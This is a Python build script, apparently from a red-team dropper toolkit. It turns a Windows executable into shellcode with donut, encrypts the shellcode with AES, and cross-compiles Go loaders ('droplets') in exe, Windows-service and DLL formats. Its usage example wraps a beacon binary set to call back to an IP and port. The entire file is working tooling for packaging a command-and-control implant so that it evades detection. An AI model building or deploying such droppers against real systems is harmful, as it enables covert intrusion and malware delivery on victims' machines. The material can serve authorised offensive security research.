#!/usr/bin/python3

import argparse
import os
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def donutTheExe(binaryPath: str, binaryArg: str):
    donutPath = os.path.join(Path(__file__).parent.parent, 'ressources/donut')
    shellcodePath =os.path.join(Path(__file__).parent.parent, 'bin/binary.bin') 

    print(donutPath, shellcodePath)

    print("[+] Creating the shellcode with donut ...")

    popen = None
    args = (donutPath, '-f', '1', "-m", "RunMe", "-x", "1", '-p', binaryArg, '-o', shellcodePath, '-i' , binaryPath)
    try:
        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
        popen.wait()
        if popen.stdout != None:
            output = popen.stdout.read()
            print(output.decode("utf-8"))

        if popen.returncode != 0:
            raise Exception
        if not os.path.isfile(shellcodePath):
            print("Shellcode not created for some reason")
            raise Exception
    except Exception as e:
        if popen and popen.stderr is not None:
            print(popen.stderr.read().decode("utf-8"))
        print(e)
        print("[-] Failed to create the shellcode")
        return ""

    print("[+] Shellcode Created and saved in " + shellcodePath + "\n")
    return shellcodePath
    

def cipherShellcode(shellcodePath: str):
    print("[+] Will Cipher the Generated Shellcode")
    key = get_random_bytes(32)
    iv = get_random_bytes(16)

    keyPath = os.path.join(Path(__file__).parent, '../bin/key')
    cipheredShellcodePath = shellcodePath + ".enc"

    with open(shellcodePath, 'rb') as f:
        shellcode = f.read()

    paddedShellcode = pad(shellcode, AES.block_size)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    cipheredShellcode = cipher.encrypt(paddedShellcode)

    with open(cipheredShellcodePath, 'wb') as f:
        f.write(iv + cipheredShellcode)

    with open(keyPath, 'wb') as f:
        f.write(key)

    print("[+] Ciphered Shellcode and Generated Key in bin/\n")

    return cipheredShellcodePath, keyPath


def generateDllGoDroplet(outputPrefix:str, arch: str):
    extension = ".dll"
    mainGoPath = "cmd/dll64bit"

    dllbitsPath = os.path.join(Path(__file__).parent.parent, 'bin/' + outputPrefix + arch + extension)
    dllbitsGoMainPath = os.path.join(Path(__file__).parent.parent, mainGoPath)

    args = ("go", "build", "-a", "-buildmode", "c-shared", "-o", dllbitsPath)

    popen = None
    exebits_env = os.environ.copy() 
    exebits_env["GOOS"] = "windows"
    exebits_env["GOARCH"] = arch
    exebits_env["CGO_ENABLED"] = "1"
    exebits_env["CC"] = "x86_64-w64-mingw32-gcc"
    exebits_env["CXX"] = "x86_64-w64-mingw32-g++"
    exebits_env["GO111MODULE"] = "on"

    print("[+] Creating " + arch + " dll droplet")

    try:
        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exebits_env, cwd=dllbitsGoMainPath)
        popen.wait()
        if popen.stdout != None:
            output = popen.stdout.read()
            print(output.decode("utf-8"))

        if popen.returncode != 0:
            raise Exception
        if not os.path.isfile(dllbitsPath):
            print(arch + " dll Droplet not created for some reason")
            raise Exception
    except Exception as e:
        if popen and popen.stderr is not None:
            print(popen.stderr.read().decode("utf-8"))
        print(e)
        print("[-] Failed to create " + arch + " dll droplet")
        return ""

    print("[+] Created " + arch + " dll droplet in " + dllbitsPath)
    return dllbitsPath


def generateGeneralExeGoDroplet(outputPrefix: str, arch: str, service: bool):

    extension = ".svc.exe" if service else ".exe" 
    mainGoPath = "cmd/svc64bit/main.go" if service else "cmd/exe64bit/main.go"
    serviceLogStrin = " service" if service else ""

    exebitsPath = os.path.join(Path(__file__).parent.parent, 'bin/' + outputPrefix + arch + extension)
    exebitsGoMainPath = os.path.join(Path(__file__).parent.parent, mainGoPath)
    args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exebitsPath, exebitsGoMainPath)

    popen = None
    exebits_env = os.environ.copy() 
    exebits_env["GOOS"] = "windows"
    exebits_env["GOARCH"] = arch
    exebits_env["CGO_ENABLED"] = "0"
    exebits_env["GO111MODULE"] = "on"

    print("[+] Creating " + arch + serviceLogStrin + " exe droplet")
    executionDir = os.path.join(Path(__file__).parent.parent)
    try:
        popen = subprocess.Popen(args, cwd=executionDir ,stdout=subprocess.PIPE, env=exebits_env)
        popen.wait()
        if popen.stdout != None:
            output = popen.stdout.read()
            print(output.decode("utf-8"))

        if popen.returncode != 0:
            raise Exception
        if not os.path.isfile(exebitsPath):
            print(arch + serviceLogStrin + " Exe Droplet not created for some reason")
            raise Exception
    except Exception as e:
        if popen and popen.stderr is not None:
            print(popen.stderr.read().decode("utf-8"))
        print(e)
        print("[-] Failed to create " + arch + serviceLogStrin + " exe droplet")
        return ""

    print("[+] Created " + arch + serviceLogStrin + " exe droplet in " + exebitsPath)
    return exebitsPath


def generateExeGoDroplet(outputPrefix: str, arch: str):
    return generateGeneralExeGoDroplet(outputPrefix, arch, False)


def generateSvcExeGoDroplet(outputPrefix: str, arch: str):
    return generateGeneralExeGoDroplet(outputPrefix, arch, True)


# Generate The GoDroplets
def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefix: str):
    listOfPath = []

    shellcodePath = donutTheExe(binaryPath, binaryArg)
    cipheredShellcodePath, keyPath = cipherShellcode(shellcodePath)

    match format:
        case "exe":
            listOfPath.append(generateExeGoDroplet(outputPrefix, "amd64"))
        case "svc":
            listOfPath.append(generateSvcExeGoDroplet(outputPrefix, "amd64"))
        case "dll":
            listOfPath.append(generateDllGoDroplet(outputPrefix, "amd64"))
        case "all":
            listOfPath.append(generateExeGoDroplet(outputPrefix, "amd64"))
            listOfPath.append(generateSvcExeGoDroplet(outputPrefix, "amd64"))
            listOfPath.append(generateDllGoDroplet(outputPrefix, "amd64"))

    return listOfPath



def main():
    parser = argparse.ArgumentParser(description="Generate the Go droplets given a binary.", epilog='Example: python3 scripts/GenerateGoDroplets.py --path="/home/kali/Desktop/BeaconHttp.exe" --arg="192.168.1.191 8080 http" --format="all" --output="droplet"')
    parser.add_argument("--path", type=str, required=False, help="Path to the binary to be wrapped to create the Go dropper")
    parser.add_argument("--arg", type=str, required=False, help="Argument that are needed for the binary", default="")
    parser.add_argument("--format",
                        choices=["exe", "svc", "dll", "all"],
                        required=False,
                        type=str,
                        help="Format of the droplet, can be exe, svc, dll or all of the above",
                        default="exe")
    parser.add_argument("--output", type=str, required=False, help="Output File Prefix", default="droplet")
    parser.add_argument('--clear', action='store_true', help='Just Clear the bin directory. If specified will not build anything.', required=False)

    args = parser.parse_args()

    if args.clear:
        print("[+] Will Delete bin/*")
        directory = os.path.join(Path(__file__).parent.parent, 'bin/')
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            
            if item == '.gitignore':
                continue
            
            if os.path.isfile(item_path):
                os.remove(item_path)
        print("[+] Deleted bin/*")
        return

    if not args.path:
        print("You need a path. Run help.")
        return

    binaryPath = args.path
    binaryArg = args.arg
    format = args.format
    outputPrefix = args.output

    generateGoDroplets(binaryPath, binaryArg, format, outputPrefix)

if __name__ == "__main__":
    main()
